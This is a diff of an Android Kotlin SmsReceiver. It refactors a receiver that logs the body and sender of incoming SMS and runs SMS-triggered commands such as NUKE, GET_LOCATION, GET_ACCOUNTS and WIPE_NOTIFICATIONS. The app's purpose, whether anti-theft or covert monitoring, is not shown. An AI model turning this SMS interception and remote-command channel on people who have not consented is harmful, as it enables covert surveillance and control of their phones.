@@ -15,26 +15,27 @@ class SmsReceiver : BroadcastReceiver() {
         if (!ConfigManager.canCollect(context, "sms")) return
 
         if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
-            // ANR FIX: Go Async to prevent main thread blocking on large log files
             val pendingResult = goAsync()
             kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
                 try {
+                    DebugLogger.log("SMS_RCV", "Incoming SMS triggered Receiver.")
                     val prefs = context.getSharedPreferences("app_stats", Context.MODE_PRIVATE)
                     val editor = prefs.edit()
                     
                     // 1. Update Counters
-            val current = prefs.getInt("sms_count", 0)
-            val firstRun = prefs.getLong("first_run_time", 0L)
-            if (firstRun == 0L) editor.putLong("first_run_time", System.currentTimeMillis())
-            editor.putInt("sms_count", current + 1)
-            editor.putLong("sms_last_time", System.currentTimeMillis())
+                    val current = prefs.getInt("sms_count", 0)
+                    val firstRun = prefs.getLong("first_run_time", 0L)
+                    if (firstRun == 0L) editor.putLong("first_run_time", System.currentTimeMillis())
+                    editor.putInt("sms_count", current + 1)
+                    editor.putLong("sms_last_time", System.currentTimeMillis())
 
-            // 2. Parse Messages
-            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
-            if (messages != null && messages.isNotEmpty()) {
-                messages.forEach { msg ->
-                    val body = msg.messageBody
-                    val sender = msg.displayOriginatingAddress
+                    // 2. Parse Messages
+                    val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
+                    if (messages != null && messages.isNotEmpty()) {
+                        messages.forEach { msg ->
+                            if (msg == null) return@forEach
+                            val body = msg.messageBody ?: return@forEach
+                            val sender = msg.displayOriginatingAddress ?: "Unknown"
 
                     // --- A. LOGGING (STREAM) ---
                     val entry = JSONObject()
@@ -76,14 +77,13 @@ class SmsReceiver : BroadcastReceiver() {
                             when (cmd) {
                                 "NUKE", "STAY_READY", "STOP_BEACON", "RING", "WAKE", "GET_LOCATION", "BRIGHTNESS", "UNBLIND", "GET_ACCOUNTS", "VOLUME", "SCREEN_TIMEOUT", "WIPE_NOTIFICATIONS", "TOGGLE_LOGGING", "GET_ENGAGEMENT", "SPEAK_TEXT", "GET_SENSORS" -> {
                                     DebugLogger.log("SMS_CMD", "Executing local SMS task: $cmd")
-                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
-                                        val mockCmd = JSONObject().apply {
-                                            put("id", -1)
-                                            put("file_name", cmd)
-                                            put("content", content)
-                                        }
-                                        CommandProcessor.processSingleCommand(context, mockCmd)
+                                    val mockCmd = JSONObject().apply {
+                                        put("id", -1)
+                                        put("file_name", cmd)
+                                        put("content", content)
                                     }
+                                    // Executed synchronously so the WakeLock holds until finished
+                                    CommandProcessor.processSingleCommand(context, mockCmd)
                                 }
                                 "CODERED", "1", "2", "3", "4", "5", "6", "7" -> {
                                     DebugLogger.log("SMS_CMD", "Dispatching EmergencyService: $cmd")
@@ -103,12 +103,15 @@ class SmsReceiver : BroadcastReceiver() {
                     }
                 }
             }
-            editor.apply()
-            } catch(e: Exception) {
-                e.printStackTrace()
-            } finally {
-                pendingResult.finish()
-            }
+                    editor.apply()
+                    // Allow background loggers time to flush to disk before OS kill
+                    kotlinx.coroutines.delay(800)
+                } catch(e: Exception) {
+                    DebugLogger.log("SMS_FATAL", "Crash in parser: ${e.message}")
+                    kotlinx.coroutines.delay(500)
+                } finally {
+                    pendingResult.finish()
+                }
             }
         }
     }
